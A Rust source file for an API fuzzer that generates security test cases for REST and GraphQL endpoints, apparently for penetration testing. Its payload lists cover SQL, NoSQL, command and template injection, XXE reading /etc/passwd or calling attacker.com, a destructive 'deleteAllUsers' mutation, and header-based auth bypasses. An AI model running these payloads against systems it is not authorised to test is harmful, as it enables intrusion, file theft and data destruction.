use std::collections::HashMap;

/// Specialized fuzzer for REST APIs and GraphQL
///! Good for api testing 

pub struct ApiFuzzer {
    http_methods: Vec<String>,
    content_types: Vec<String>,
    auth_types: Vec<AuthType>,
    payload_templates: HashMap<String, Vec<String>>,
}

#[derive(Debug, Clone)]
pub enum AuthType {
    None,
    Bearer(String),
    Basic { username: String, password: String },
    ApiKey { header: String, key: String },
}

impl ApiFuzzer {
    pub fn new() -> Self {
        let mut fuzzer = Self {
            http_methods: vec![
                "GET".to_string(),
                "POST".to_string(),
                "PUT".to_string(),
                "DELETE".to_string(),
                "PATCH".to_string(),
                "OPTIONS".to_string(),
                "HEAD".to_string(),
            ],
            content_types: vec![
                "application/json".to_string(),
                "application/x-www-form-urlencoded".to_string(),
                "multipart/form-data".to_string(),
                "text/plain".to_string(),
                "application/xml".to_string(),
                "application/graphql".to_string(),
            ],
            auth_types: vec![AuthType::None],
            payload_templates: HashMap::new(),
        };
        
        fuzzer.load_payload_templates();
        fuzzer
    }

    fn load_payload_templates(&mut self) {
        // SQL injection templates
        self.payload_templates.insert(
            "sqli".to_string(),
            vec![
                r#"'"or'1'='1"#.to_string(),
                r#"'union select 1,2,3--"#.to_string(),
                r#"1' and 1=1--"#.to_string(),
                r#"1' and 1=2--"#.to_string(),
                r#"' AND (SELECT * FROM (SELECT(SLEEP(5)))a)"#.to_string(),
                r#"' AND 1=CONVERT(int,(SELECT @@version))--"#.to_string(),
            ]
        );

        // NoSQL injection templates
        self.payload_templates.insert(
            "nosql".to_string(),
            vec![
                r#"{"$ne": null}"#.to_string(),
                r#"{"$gt": ""}"#.to_string(),
                r#"{"$regex": ".*"}"#.to_string(),
                r#"{"$where": "this.password.length > 0"}"#.to_string(),
            ]
        );

        // GraphQL injection templates
        self.payload_templates.insert(
            "graphql".to_string(),
            vec![
                r#"{__typename}"#.to_string(),
                r#"{__schema{types{name}}}"#.to_string(),
                r#"{__schema{queryType{name}}}"#.to_string(),
                r#"query{__type(name:\"User\"){fields{name}}}"#.to_string(),
                r#"mutation{deleteAllUsers}"#.to_string(),
            ]
        );

        // Command injection templates
        self.payload_templates.insert(
            "cmdi".to_string(),
            vec![
                ";id".to_string(),
                ";whoami".to_string(),
                "|ls".to_string(),
                "`cat /etc/passwd`".to_string(),
                "$(cat /etc/passwd)".to_string(),
            ]
        );

        // XXE templates
        self.payload_templates.insert(
            "xxe".to_string(),
            vec![
                r#"<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>"#.to_string(),
                r#"<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/">]><foo>&xxe;</foo>"#.to_string(),
            ]
        );

        // SSTI templates
        self.payload_templates.insert(
            "ssti".to_string(),
            vec![
                "{{7*7}}".to_string(),
                "{{config.items()}}".to_string(),
                "${7*7}".to_string(),
                "<%= 7 * 7 %>".to_string(),
                "#{7*7}".to_string(),
            ]
        );
    }

    /// Generate REST API test cases
    pub fn generate_rest_tests(&self, base_url: &str, endpoints: &[String]) -> Vec<ApiTestCase> {
        let mut tests = Vec::new();
        
        for endpoint in endpoints {
            let url = format!("{}{}", base_url.trim_end_matches('/'), endpoint);
            
            for method in &self.http_methods {
                // Basic endpoint test
                tests.push(ApiTestCase {
                    url: url.clone(),
                    method: method.clone(),
                    headers: HashMap::new(),
                    body: None,
                    auth: AuthType::None,
                    test_type: "basic".to_string(),
                });
                
                // Test with different content types for POST/PUT
                if method == "POST" || method == "PUT" {
                    for content_type in &self.content_types {
                        let mut headers = HashMap::new();
                        headers.insert("Content-Type".to_string(), content_type.clone());
                        
                        tests.push(ApiTestCase {
                            url: url.clone(),
                            method: method.clone(),
                            headers,
                            body: Some(self.generate_body_for_content_type(content_type)),
                            auth: AuthType::None,
                            test_type: "content_type".to_string(),
                        });
                    }
                }
                
                // Test authentication variations
                for auth in &self.auth_types {
                    tests.push(ApiTestCase {
                        url: url.clone(),
                        method: method.clone(),
                        headers: HashMap::new(),
                        body: None,
                        auth: auth.clone(),
                        test_type: "auth".to_string(),
                    });
                }
            }
            
            // Add injection tests
            tests.extend(self.generate_injection_tests(&url));
        }
        
        tests
    }

    /// Generate injection-specific tests
    fn generate_injection_tests(&self, url: &str) -> Vec<ApiTestCase> {
        let mut tests = Vec::new();
        
        for (vuln_type, payloads) in &self.payload_templates {
            for payload in payloads.iter().take(3) {
                // JSON body injection
                let body = format!(r#"{{"input": "{}"}}"#, payload.replace("\"", "\\\""));
                let mut headers = HashMap::new();
                headers.insert("Content-Type".to_string(), "application/json".to_string());
                
                tests.push(ApiTestCase {
                    url: url.to_string(),
                    method: "POST".to_string(),
                    headers,
                    body: Some(body),
                    auth: AuthType::None,
                    test_type: format!("injection_{}", vuln_type),
                });
                
                // URL parameter injection
                let param_url = format!("{}?test={}", url, urlencoding::encode(payload));
                tests.push(ApiTestCase {
                    url: param_url,
                    method: "GET".to_string(),
                    headers: HashMap::new(),
                    body: None,
                    auth: AuthType::None,
                    test_type: format!("param_injection_{}", vuln_type),
                });
            }
        }
        
        tests
    }

    /// Generate GraphQL-specific tests
    pub fn generate_graphql_tests(&self, endpoint: &str) -> Vec<ApiTestCase> {
        let mut tests = Vec::new();
        
        // Introspection queries
        let introspection_queries = vec![
            ("Introspection", r#"{__schema{types{name,fields{name}}}}"#),
            ("Query Type", r#"{__schema{queryType{name}}}"#),
            ("All Types", r#"{__schema{types{name,kind}}}"#),
        ];
        
        for (name, query) in introspection_queries {
            let body = format!(r#"{{"query": "{}"}}"#, query.replace("\"", "\\\""));
            let mut headers = HashMap::new();
            headers.insert("Content-Type".to_string(), "application/json".to_string());
            
            tests.push(ApiTestCase {
                url: endpoint.to_string(),
                method: "POST".to_string(),
                headers,
                body: Some(body),
                auth: AuthType::None,
                test_type: format!("graphql_{}", name.to_lowercase().replace(" ", "_")),
            });
        }
        
        // Batch query test (potential DoS)
        let batch_query = r#"[{"query": "{__typename}"}, {"query": "{__typename}"}, {"query": "{__typename}"}]"#;
        let mut headers = HashMap::new();
        headers.insert("Content-Type".to_string(), "application/json".to_string());
        
        tests.push(ApiTestCase {
            url: endpoint.to_string(),
            method: "POST".to_string(),
            headers,
            body: Some(batch_query.to_string()),
            auth: AuthType::None,
            test_type: "graphql_batch".to_string(),
        });
        
        tests
    }

    /// Generate body content based on content type
    fn generate_body_for_content_type(&self, content_type: &str) -> String {
        match content_type {
            "application/json" => r#"{"key": "value", "test": "data"}"#.to_string(),
            "application/x-www-form-urlencoded" => "key=value&test=data".to_string(),
            "multipart/form-data" => "------FormBoundary\r\nContent-Disposition: form-data; name=\"key\"\r\n\r\nvalue\r\n------FormBoundary--".to_string(),
            "text/plain" => "test data".to_string(),
            "application/xml" => "<root><key>value</key></root>".to_string(),
            "application/graphql" => r#"query { __typename }"#.to_string(),
            _ => "test".to_string(),
        }
    }

    /// Test for API authentication bypass
    pub fn generate_auth_bypass_tests(&self, endpoint: &str) -> Vec<ApiTestCase> {
        let mut tests = Vec::new();
        
        let bypass_headers = vec![
            ("X-Original-URL", endpoint),
            ("X-Rewrite-URL", endpoint),
            ("X-Forwarded-For", "127.0.0.1"),
            ("X-Real-IP", "127.0.0.1"),
            ("X-Remote-IP", "127.0.0.1"),
            ("X-Client-IP", "127.0.0.1"),
            ("X-Forwarded-Host", "localhost"),
            ("X-Host", "localhost"),
            ("X-HTTP-Host-Override", "localhost"),
        ];
        
        for (header, value) in bypass_headers {
            let mut headers = HashMap::new();
            headers.insert(header.to_string(), value.to_string());
            
            tests.push(ApiTestCase {
                url: endpoint.to_string(),
                method: "GET".to_string(),
                headers,
                body: None,
                auth: AuthType::None,
                test_type: "auth_bypass".to_string(),
            });
        }
        
        // Test HTTP method override
        let method_overrides = vec![
            ("X-HTTP-Method-Override", "DELETE"),
            ("X-HTTP-Method", "PUT"),
            ("_method", "DELETE"),
        ];
        
        for (param, method) in method_overrides {
            let url = format!("{}?{}={}", endpoint, param, method);
            tests.push(ApiTestCase {
                url,
                method: "POST".to_string(),
                headers: HashMap::new(),
                body: None,
                auth: AuthType::None,
                test_type: "method_override".to_string(),
            });
        }
        
        tests
    }

    /// Detect API technology from response
    pub fn detect_api_tech(&self, headers: &HashMap<String, String>, body: &str) -> Vec<String> {
        let mut tech = Vec::new();
        
        // Check headers
        for (key, value) in headers {
            let key_lower = key.to_lowercase();
            let val_lower = value.to_lowercase();
            
            match key_lower.as_str() {
                "x-powered-by" => tech.push(format!("Framework: {}", value)),
                "server" => tech.push(format!("Server: {}", value)),
                "x-aspnet-version" => tech.push("ASP.NET".to_string()),
                "x-generator" => tech.push(format!("Generator: {}", value)),
                _ => {}
            }
            
            if val_lower.contains("django") { tech.push("Django".to_string()); }
            if val_lower.contains("rails") { tech.push("Rails".to_string()); }
            if val_lower.contains("express") { tech.push("Express".to_string()); }
        }
        
        // Check body patterns
        if body.contains("swagger") || body.contains("openapi") {
            tech.push("OpenAPI/Swagger".to_string());
        }
        if body.contains("graphql") || body.contains("__schema") {
            tech.push("GraphQL".to_string());
        }
        if body.contains("error") && body.contains("trace") {
            tech.push("Debug Mode Enabled".to_string());
        }
        
        tech
    }

    /// Set authentication for tests
    pub fn set_auth(&mut self, auth: AuthType) {
        self.auth_types.push(auth);
    }

    /// Get all vulnerability templates
    pub fn get_templates(&self) -> &HashMap<String, Vec<String>> {
        &self.payload_templates
    }
}

#[derive(Debug, Clone)]
pub struct ApiTestCase {
    pub url: String,
    pub method: String,
    pub headers: HashMap<String, String>,
    pub body: Option<String>,
    pub auth: AuthType,
    pub test_type: String,
}

#[derive(Debug, Clone)]
pub struct ApiFinding {
    pub endpoint: String,
    pub method: String,
    pub vulnerability: String,
    pub severity: String,
    pub evidence: String,
}
